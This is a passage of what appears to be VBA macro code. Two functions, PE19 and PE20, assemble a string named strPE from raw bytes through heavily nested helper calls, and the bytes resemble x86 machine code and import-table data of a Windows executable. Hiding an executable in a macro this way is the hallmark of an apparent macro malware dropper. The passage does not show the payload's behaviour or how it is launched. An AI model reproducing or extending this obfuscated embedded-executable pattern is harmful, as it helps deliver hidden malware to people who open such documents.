    strPE = A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(strPE, 0), 161), 144), 170), "A"), 0), 137), "E"), 216), 141), "E"), 216), "P"), 255), "5"), 140), 219), "A"), 0), 141), "E"), 224), "P"), 5), "E"), 166), "P"), 141), "E"), 216), "P"), 255), 21), 232), 192), "G"), 0), "h"), 4), 208), "@"), 0), 204), 0), 208), "0"), 130), 232), "("), 2)
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 0), "%"), 255), 21), 236), 187), 249), 0), 139), "M"), 224), 137), 8), 255), "u"), 24), 255), 31), 243), 255), "u@"), 232), 227), "X"), 5), 255), 131), 196), "0"), 137), "E"), 220), "P"), 255), 21), "p<@"), 0), 139), 141), 236), 139), 8), 139), 9), 188), "M"), 208)
    strPE = A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(strPE, "PQ"), 232), 235), 1), 27), 22), "YY"), 195), 139), ":"), 232), 138), "u"), 208), 247), 196), 244), 156), 175), 0), 204), 204), 204), 204), 204), 204), "SW3"), 255), 139), "^$"), 4), 11), 192), "h"), 20), "G"), 139), "T$"), 12), 247), 216), 247), 218), 131)
    strPE = B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(strPE, 216), 0), 137), "D$"), 16), 137), "T"), 216), 12), 139), "D$2"), 11), 192), 185), 19), 181), "T$"), 25), 1), 216), 247), 218), 131), 176), 0), 137), 216), "$"), 24), 137), "T"), 229), 20), 11), "8un"), 139), "L$"), 20), 162), "D"), 130), 16), "3")
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 210), 247), 241), 139), "D$"), 12), 247), 241), 139), 194), "3"), 210), "OyN"), 242), "S"), 139), 216), "\L$"), 20), 161), "Tq"), 16), 168), "D$"), 12), 209), 13), 145), 217), 209), 234), 209), 216), 11), 219), "u"), 244), 247), 241), 139), 200), 247), "d")
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(strPE, 238), "X"), 198), 247), "d$"), 127), 8), 209), "r"), 14), ";T$"), 205), "w"), 8), "r"), 14), ";D$"), 12), "vc+"), 238), "$"), 20), 27), "Tn"), 24), "+D$"), 12), 27), "TU"), 16), "O"), 3), 7), 247), 218), 247), 216), 131), 218)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(strPE, 0), "_["), 194), 222), 0), 204), "u"), 204), 204), 204), 204), 214), 204), 177), 204), "L"), 204), 204), 204), 128), 249), "@X"), 23), 128), "H s"), 6), 214), 173), 208), 221), 250), 195), 241), 194), 193), 250), 31), 128), 225), 31), 7), "i"), 195), 193), 250), 31)
    strPE = A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 139), 194), 195), 204), 231), 204), 204), 177), 204), 204), 191), 204), 204), "x"), 204), 204), 204), 204), "Q="), 0), 207), 0), "X"), 141), "L"), 202), 8), "r"), 163), 129), 233), 0), 16), 0), 34), "-"), 0), 16), "Y"), 0), "J"), 1), "="), 0), 23), 4), 0), 208), 135)
    strPE = B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(strPE, "+"), 242), 139), 31), 133), 1), 139), 225), 139), 8), 139), "@"), 6), "P"), 195), "R5"), 249), "@s"), 21), 128), 249), "ms"), 6), "1"), 165), 194), 211), 224), 195), 139), 208), "3)"), 128), 225), "^"), 211), 226), 195), 180), 192), "H"), 210), 174), 204), "?V")
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(strPE, 139), "D$"), 24), 11), 192), "u"), 24), 139), "L$"), 159), 139), "J$"), 201), "3"), 210), 247), 247), 139), 216), 139), "n$"), 12), 247), 241), " "), 211), "GA"), 190), 200), 139), "\$"), 20), 139), 246), "$"), 16), 139), "D$"), 12), 209), 233), 209), 219)
    strPE = A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 209), 234), 209), 14), 0), 201), "u"), 244), 247), 243), 139), 240), 247), "d$"), 24), 139), 200), 139), "D$"), 20), "|"), 230), 3), 209), "r"), 14), ";T"), 141), 16), "w"), 8), "r"), 7), ";u$Nv"), 1), "N3"), 210), 139), 202), "^["), 194)
    strPE = B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 171), 0), 204), 204), 217), 140), 204), "`"), 204), 204), "a"), 249), "@"), 165), 21), "4"), 249), 208), "s"), 6), 15), 173), 208), 211), 234), 195), 139), 194), 15), 210), 128), 225), "?"), 211), 232), 195), "3"), 192), "3"), 210), 195), 204), "<%"), 252), 192), "@"), 176), "g%")
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 220), 192), "@"), 0), ">%"), 228), 192), "@"), 0), "h"), 0), 0), 3), 0), "h"), 0), 196), 1), 0), 232), 13), 0), 0), 0), "YY"), 10), "3"), 192), 195), 195), 132), "%"), 229), "'@F"), 233), 8), 132), 193), "@"), 0), 204), 177), 204), 204), 242), 204)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(strPE, 204), "q"), 204), 204), 30), 204), 255), "%"), 17), 193), 142), 0), 0), 0), 0), 0), 0), 133), "z"), 0), 0), 0), 0), 7), 255), 0), 0), 0), 0), "%"), 0), 222), 0), 0), 0), 0), 0), 0), "]"), 0), 0), 0), 237), 0), 0), 0), 227), 0), 193), 0)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 0), 248), 255), 0), "/"), 151), 1), 188), 190), 176), 0), 0), "Z"), 0), 0), 0), 0), 194), 0), 0), "@8"), 0), 0), 0), 0), "Q"), 0), 0), 0), 0), 0), "="), 0), 0), 0), 176), 0), 0), 0), 132), "7"), 0), 0), 0), 0), 0), 143)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 177), 0), 0), 0), 0), 0), "2"), 0), 0), 0), 0), 199), 28), 0), 0), 0), 0), 0), 0), 239), 0), 0), 211), 232), 0), 0), 0), 0), 0), 242), 0), 0), 0), 0), 0), 0), 0), "?"), 0), 0), 155), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(strPE, 0), 181), 223), 237), 0), 250), 0), "}"), 0), 0), 0), "O"), 195), 0), 0), 0), 0), 0), 181), 0), 0), 0), 139), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 151), 0), 0), 0), 0), 0), 0), "\M"), 151)
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 17), 0), 153), 0), 0), 0), 0), 0), 0), 201), 0), 154), 0), 0), 0), 0), 0), 0), " "), 0), 0), 0), 0), 0), 197), 0), 0), 0), 0), 141), 0), 0), "V"), 0), 0), 0), 0), 3), 0), 0), "^"), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 0), 0), 0), "r"), 0), 0), 0), "3"), 0), 0), 0), 0), 26), 0), 186), 0), 0), 0), 0), 225), 0), 0), 0), 0), 190), 0), 0), 0), 0), 0), "q"), 0), 0), 0), 0), 0), 0), 0), 148), 0), 0), ">9"), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "4e"), 0), 0), 0), 0), 0), 0), 0), 229), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 200), 0), 0), 0), 0), 152), 0), 0), 0), 151), 0), 0), 0), 0), "#"), 0), 0), 229), 0), "G"), 228), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 170), 0), 252), 0), 0), 0), 0), 0), "V!"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 203), 0), 0), 0), "M"), 0), 0), "s"), 0), 0), 0), 0), 0), 0), "U"), 0), 0), 0), 0), 0), 209), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 220), 236), 0), 130), 0), 0), 0), 0), 0), 0), "v"), 0), 0), 249), 0), 0), 206), 0), "e"), 14), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 141), 0), ":"), 10), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 222), 0), 154), 0), 18), 0), 0), 0), "s"), 0), 0), 204), "A"), 34), 0), 0), 0), 0), 0), 234), 0), 0), 0), 176), 0), 0), 0), 0), 0), 0), 0), 131), 0), 0), 0), 0), 0), "I"), 0), 236), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 144), 0), 247), 3), 163), 0), 0), 0), 0), 222), "WM"), 0), 0), 0), 0), 0), 0), 0), 0), 0), "e"), 0), 0), 0), 0), 161), 157), 0), 242), 0), 0), 186), 0), 0), 0), 0), 244), 0), 29), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(strPE, 252), 135), 0), 0), 0), 0), "c"), 0), 0), 0), 0), ":"), 0), "c"), 0), 0), 0), "|"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 10), 0), 0), 0), 0), 0), 240), "r"), 0), 0), 0), 0), 0), 0), 0), 0), 205), 0), 0), "D"), 0)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 147), 0), 234), "7"), 143), 158), 0), 0), 0), 0), 0), 226), 0), 230), 0), 0), 0), 0), "U"), 0), 0), 0), 229), "9"), 0), 0), 0), 232), 0), 0), 0), 0), 158), 0), 21), 2), "z"), 168), 0), 194), 0), 0), 0), "b"), 240), 250), 0), 224), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 29), 0), 0), 0), 0), 0), 0), 0), 0), 4), 0), 0), 0), 0), 0), 0), 0), 212), 0), 176), 0), 0), 0), 161), 148), 0), 0), 0), 0), 0), 171), 0), 0), 0), 0), 153), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 143), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 212), 29), 0), 0), 0), 0), 0), 0), 244), 0), 0), 0), 0), "M4"), 0), 200), 0), 150), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 3), 0), 0), 0), 0), 0), 25), 0), 0), 0), 0), 133), 0), 0), 240), 0), 168), 0), "z"), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 0), 0), "g"), 0), 0), 0), 0), "r"), 172), 0), 0), 0), 0), "a"), 146), 198), 0), 0), 0), 0), 0), 0), 0), 0), "B"), 0), 0), 189), 255), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 226), 0), 0), 0), 34), 0), 0), 0), 0)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "M"), 0), 0), 31), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), ":"), 0), 0), 0), 0), 0), 0), "@"), 0), "Z="), 0), 0), 0), 0), "6"), 0), 0), 0), 0), 0), 242), 184), 0), 0), 0), 249), 0), 136), 0), "$"), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 135), 0), 153), 0), "V"), 0), 166), 0), 178), 0), 0), 0), 0), 0), 0), 0), 0), 0), "c"), 0), 152), 0), 0), 28), 211), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 229), 132), "Y"), 0), 0), 0), 0), 0), 161), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 228), 0), "n"), 0), 0), 212), 200), 222), 149), "%"), 0), 0), 224), 0), 0), 0), 0), 0), 151), 0), 0), 0), 0), 0), 0), 0), 0), "."), 0), 0), 0), 0), 0), 0), 0), 0), 0), "'"), 0), 0), 0), 0), 30), 0), 5), 0), "P"), 1)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "}x"), 0), 0), 0), 0), 0), 0), 137), 0), 0), 0), "F"), 0), 0), 0), 0), 0), "p"), 0), 147), 0), 0), 0), 0), 0), 0), "^"), 0), 0), 0), 0), 0), "V"), 0), 11), 0), 0), 0), 237), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "*"), 0), 201), "S"), 0), 0), 0), 0), 0), 0), 181), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 252), 0), 0), 0), 0), 0), 0), 0), 0), 203), 214), 0), 0), 0), 0), 0), 0), 0), "~"), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), "y"), 0), 0), 0), 194), 0), "S"), 181), "`"), 0), 0), 0), 161), 0), 0), 0), 0), 0), 0), 0), 0), 0), 22), 0), 0), 0), 214), 0), 0), 0), 13), 0), 136), 0), 0), 0), 0), 249), 0), 0), 0), 0), 0), "#"), 0)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), "U"), 0), 0), 145), 0), "9"), 0), "E."), 0), 0), 0), 0), 0), 0), 0), 201), 0), 0), 19), 0), 0), "W"), 0), 0), 0), ","), 146), "e"), 0), 0), 0), "P"), 0), 0), 0), "g"), 0), 0), "^"), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), "A"), 0), 0), 0), 147), 0), 0), 192), "I"), 0), 247), 0), 228), 0), 0), 0), "a"), 0), 0), 0), 0), 177), "M"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 182), 0), 0), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 129), 166), 0), 0), 0), 0), 0), 0), 0), "y"), 0), 0), 0), 24), 0), 0), 0), 0), 179), 24), 0), 0), 0), 0), 157), 0), "5"), 0), 0), 0), 0), 0), 0), 144), "'"), 185), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 251), 0), 0), 0), 0), 202), 252), 137), 0), 0), 0), 0), 0), 0), 0), 0), "f"), 0), 0), 0), "T"), 28), "W"), 0), 0), 189), 210), 28), 0), 0), 0), 0), 0), 195), 0), 0), 0), 0), 0), 0), 0), 19), 133), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 146), 0), 16), "["), 0), 195), "p"), 12), 0), 0), 0), 232), 127), 0), 0), 0), 192), 0), 0), 0), 0), 0), 0), 12), 30), 0), 221), 0), 0), 0), 0), 0), 0), 0), 179), 0), "R"), 0), "R"), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "xl"), 0), 0), 0), 224), 219), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "D`"), 145), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "2"), 0), 34), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 248), 0), 247), 0), 0), 0), 179), 0), 0), 0), 0), 254), 0), 139), "/"), 0), 0), 0), "i"), 0), "X"), 134), 0), 0), 168), 0), 0), 0), 0), 0), 0), 0), 0), 0), "!"), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 0), 0), 0), 133), 0), "I"), 0), 0), 137), 0), 0), 0), 0), 131), 0), 0), 10), 0), 175), 0), 236), 0), 0), 0), 0), 237), 0), 0), 0), 0), 0), 236), 0), 0), 0), 180), 0), "U"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), ":"), 161)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "r"), 0), 0), 0), 0), 27), 0), 0), 0), 0), 0), ";"), 0), 0), 0), 0), 21), 0), 238), 0), 0), 200), "w"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "p"), 0), 0), 0), 0), 168), 0), 0), 0), 0), 0), 7)

    PE19 = strPE
End Function

Private Function PE20() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 13), 0), 0), 153), 0), 0), 0), 0), 0), ")t"), 0), "("), 0), 0), 0), 0), 0), 0), 0), 0), 0), "H"), 0), 0), 0), 0), 0), 12), 0), 0)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 0), 224), 0), "2"), 0), 0), 0), 0), "$]"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 157), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 176), 0), 0), 0), 0), 0), "S"), 0), 168)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 0), 0), 6), 0), 0), "-"), 0), 0), 0), 0), 0), 0), "."), 173), 0), 0), 0), 133), 0), 0), 0), 241), 25), 0), 0), 0), 0), 0), 0), 0), 0), 12), 0), 0), 0), 0), 1), 0), 0), 0), 224), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 140), 207), 0), 0), "p"), 207), 0), 0), 0), 0), 0), 0), "R"), 207), 0), 0), "F"), 207), 0), 0), ":"), 207), 0), 0), "*"), 207), 0), 0), 24), 207), 0), 0), 8), 207), 0), 0), 242), 206), 0), 0), 222), 206), 0), 0), 198), 206), 0), 0)
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 186), 206), 0), 0), 170), 206), 0), 0), 146), 206), 0), 0), "z"), 206), 0), 0), "^"), 206), 0), 0), "N"), 206), 0), 0), "@"), 206), 0), 0), 250), 203), 0), 0), 10), 204), 0), 0), "$"), 204), 0), 0), ">"), 204), 0), 0), "L"), 204), 0), 0), "^"), 204)
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 0), 0), "j"), 204), 0), 0), "t"), 204), 0), 0), 134), 204), 0), 0), 154), 204), 0), 0), 178), 204), 0), 0), 192), 204), 0), 0), 218), 204), 0), 0), 242), 204), 0), 0), 12), 205), 0), 0), "&"), 205), 0), 0), ">"), 205), 0), 0), "`"), 205), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "h"), 205), 0), 0), "z"), 205), 0), 0), 138), 205), 0), 0), 160), 205), 0), 0), 176), 205), 0), 0), 192), 205), 0), 0), 210), 205), 0), 0), 224), 205), 0), 0), 238), 205), 0), 0), 4), 206), 0), 0), 22), 206), 0), 0), "4"), 206), 0), 0), 0), 0)
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 196), 201), 0), 0), 216), 203), 0), 0), 198), 203), 0), 0), 184), 203), 0), 0), 168), 203), 0), 0), 152), 203), 0), 0), 132), 203), 0), 0), "x"), 203), 0), 0), "h"), 203), 0), 0), "X"), 203), 0), 0), "J"), 203), 0), 0), "B"), 203), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "8"), 203), 0), 0), "*"), 203), 0), 0), 20), 203), 0), 0), 10), 203), 0), 0), 0), 203), 0), 0), 246), 202), 0), 0), 236), 202), 0), 0), 224), 202), 0), 0), 216), 202), 0), 0), 206), 202), 0), 0), 196), 202), 0), 0), 180), 202), 0), 0), 164), 202)
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 154), 202), 0), 0), 146), 202), 0), 0), 136), 202), 0), 0), "~"), 202), 0), 0), "t"), 202), 0), 0), "l"), 202), 0), 0), "d"), 202), 0), 0), "\"), 202), 0), 0), "R"), 202), 0), 0), "H"), 202), 0), 0), ">"), 202), 0), 0), "4"), 202), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "*"), 202), 0), 0), " "), 202), 0), 0), 22), 202), 0), 0), 10), 202), 0), 0), 2), 202), 0), 0), 250), 201), 0), 0), 234), 201), 0), 0), 224), 201), 0), 0), 214), 201), 0), 0), 204), 201), 0), 0), 236), 203), 0), 0), 220), 207), 0), 0), 208), 207)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 186), 207), 0), 0), 176), 207), 0), 0), 0), 0), 0), 0), 7), 0), 0), 128), 4), 0), 0), 128), 9), 0), 0), 128), "4"), 0), 0), 128), 14), 0), 0), 128), 12), 0), 0), 128), 21), 0), 0), 128), 23), 0), 0), 128)
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 3), 0), 0), 128), 18), 0), 0), 128), 10), 0), 0), 128), 151), 0), 0), 128), "s"), 0), 0), 128), "t"), 0), 0), 128), "o"), 0), 0), 128), 0), 0), 0), 0), 0), 0), 0), 0), "6"), 128), 193), "J"), 0), 0), 0), 0), 2), 0), 0), 0), "J"), 0)
